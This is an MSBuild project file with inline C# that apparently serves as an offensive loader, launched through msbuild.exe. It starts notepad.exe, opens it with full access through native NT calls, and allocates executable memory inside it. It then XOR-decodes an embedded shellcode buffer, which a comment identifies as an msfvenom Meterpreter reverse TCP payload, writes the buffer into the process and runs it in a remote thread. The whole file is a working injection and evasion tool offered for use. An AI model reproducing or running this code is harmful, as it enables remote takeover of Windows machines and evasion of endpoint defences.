<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe processHollow.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Collections.Generic;
          using System.Diagnostics;
          using System.Runtime.InteropServices;
          using System.Threading;
          using Microsoft.Build.Utilities;

          public class ClassExample : Microsoft.Build.Utilities.Task
          {
              private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
              private static readonly uint MEM_COMMIT = 0x1000;
              private static readonly uint MEM_RESERVE = 0x2000;

              [StructLayout(LayoutKind.Sequential)]
              public struct CLIENT_ID
              {
                  public IntPtr UniqueProcess;
                  public IntPtr UniqueThread;
              }

              [StructLayout(LayoutKind.Sequential, Pack = 0)]
              public struct OBJECT_ATTRIBUTES
              {
                  public int Length;
                  public IntPtr RootDirectory;
                  public IntPtr ObjectName;
                  public uint Attributes;
                  public IntPtr SecurityDescriptor;
                  public IntPtr SecurityQualityOfService;
              }

              [DllImport("ntdll.dll", SetLastError = true)]
              static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);

              [DllImport("ntdll.dll", SetLastError = true)]
              static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

              [DllImport("ntdll.dll", SetLastError = true)]
              static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

              [DllImport("ntdll.dll", SetLastError = true)]
              static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

              public static void Main()
              {

                  Process.Start("C:\\Windows\\SysWow64\\notepad.exe");
                  Process[] targetProcess = Process.GetProcessesByName("notepad");
                  IntPtr htargetProcess = targetProcess[0].Handle;


                  // Prepare the CLIENT_ID and OBJECT_ATTRIBUTES for NtOpenProcess
                  IntPtr hProcess = IntPtr.Zero;
                  CLIENT_ID clientid = new CLIENT_ID();
                  clientid.UniqueProcess = new IntPtr(targetProcess[0].Id);
                  clientid.UniqueThread = IntPtr.Zero;
                  OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();

                  uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref ObjectAttributes, ref clientid);
                  
                  // Example shellcode (This should be replaced with actual shellcode from msfvenom)
                  // msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread
                  // XOR'd with key 0xfa
                  byte[] buf = new byte[375] { 0x06,0x12,0x75,0xFA,0xFA,0xFA,0x9A,0xCB,0x28,0x73,0x1F,0x9E,0x71,0xA8,0xCA,0x71,0xA8,0xF6,0x71,0xA8,0xEE,0xF5,0x4D,0xB0,0xDC,0x71,0x88,0xD2,0xCB,0x05,0xCB,0x3A,0x56,0xC6,0x9B,0x86,0xF8,0xD6,0xDA,0x3B,0x35,0xF7,0xFB,0x3D,0xB3,0x8F,0x15,0xA8,0x71,0xA8,0xEA,0xAD,0x71,0xB8,0xC6,0xFB,0x2A,0x71,0xBA,0x82,0x7F,0x3A,0x8E,0xB6,0xFB,0x2A,0x71,0xA2,0xDA,0xAA,0xFB,0x29,0x71,0xB2,0xE2,0x7F,0x33,0x8E,0xC6,0xCB,0x05,0xB3,0x71,0xCE,0x71,0xFB,0x2C,0xCB,0x3A,0x3B,0x35,0xF7,0x56,0xFB,0x3D,0xC2,0x1A,0x8F,0x0E,0xF9,0x87,0x02,0xC1,0x87,0xDE,0x8F,0x1A,0xA2,0x71,0xA2,0xDE,0xFB,0x29,0x9C,0x71,0xF6,0xB1,0x71,0xA2,0xE6,0xFB,0x29,0x71,0xFE,0x71,0xFB,0x2A,0x73,0xBE,0xDE,0xDE,0xA1,0xA1,0x9B,0xA3,0xA0,0xAB,0x05,0x1A,0xA2,0xA5,0xA0,0x71,0xE8,0x13,0x7A,0x05,0x05,0x05,0xA7,0x92,0xC9,0xC8,0xFA,0xFA,0x92,0x8D,0x89,0xC8,0xA5,0xAE,0x92,0xB6,0x8D,0xDC,0xFD,0x73,0x12,0x05,0x2A,0x42,0x6A,0xFB,0xFA,0xFA,0xD3,0x3E,0xAE,0xAA,0x92,0xD3,0x7A,0x91,0xFA,0x05,0x2F,0x90,0xF0,0x92,0x3A,0x52,0xC8,0x6B,0x92,0xF8,0xFA,0xFB,0x41,0x73,0x1C,0xAA,0xAA,0xAA,0xAA,0xBA,0xAA,0xBA,0xAA,0x92,0x10,0xF5,0x25,0x1A,0x05,0x2F,0x6D,0x90,0xEA,0xAC,0xAD,0x92,0x63,0x5F,0x8E,0x9B,0x05,0x2F,0x7F,0x3A,0x8E,0xF0,0x05,0xB4,0xF2,0x8F,0x16,0x12,0x9D,0xFA,0xFA,0xFA,0x90,0xFA,0x90,0xFE,0xAC,0xAD,0x92,0xF8,0x23,0x32,0xA5,0x05,0x2F,0x79,0x02,0xFA,0x84,0xCC,0x71,0xCC,0x90,0xBA,0x92,0xFA,0xEA,0xFA,0xFA,0xAC,0x90,0xFA,0x92,0xA2,0x5E,0xA9,0x1F,0x05,0x2F,0x69,0xA9,0x90,0xFA,0xAC,0xA9,0xAD,0x92,0xF8,0x23,0x32,0xA5,0x05,0x2F,0x79,0x02,0xFA,0x87,0xD2,0xA2,0x92,0xFA,0xBA,0xFA,0xFA,0x90,0xFA,0xAA,0x92,0xF1,0xD5,0xF5,0xCA,0x05,0x2F,0xAD,0x92,0x8F,0x94,0xB7,0x9B,0x05,0x2F,0xA4,0xA4,0x05,0xF6,0xDE,0xF5,0x7F,0x8A,0x05,0x05,0x05,0x13,0x61,0x05,0x05,0x05,0xFB,0x39,0xD3,0x3C,0x8F,0x3B,0x39,0x41,0x1A,0xE7,0xD0,0xF0,0x92,0x5C,0x6F,0x47,0x67,0x05,0x2F,0xC6,0xFC,0x86,0xF0,0x7A,0x01,0x1A,0x8F,0xFF,0x41,0xBD,0xE9,0x88,0x95,0x90,0xFA,0xA9,0x05,0x2F };

                  // Allocate memory for shellcode in target process
                  IntPtr baseAddress = IntPtr.Zero;
                  IntPtr regionSize = (IntPtr)buf.Length;
                  IntPtr NtAllocResult = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                  // Decode shellcode (XOR with key 0xfa)
                  for (int j = 0; j < buf.Length; j++)
                  {
                      buf[j] = (byte)((uint)buf[j] ^ 0xfa);
                  }

                  // Write shellcode to target process memory
                  uint wr;
                  int NtWriteProcess = NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out wr);

                  // Create a remote thread in the target process to execute the shellcode
                  IntPtr hRemoteThread;
                  uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

              }

              public override bool Execute()
              {
                  Main();
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
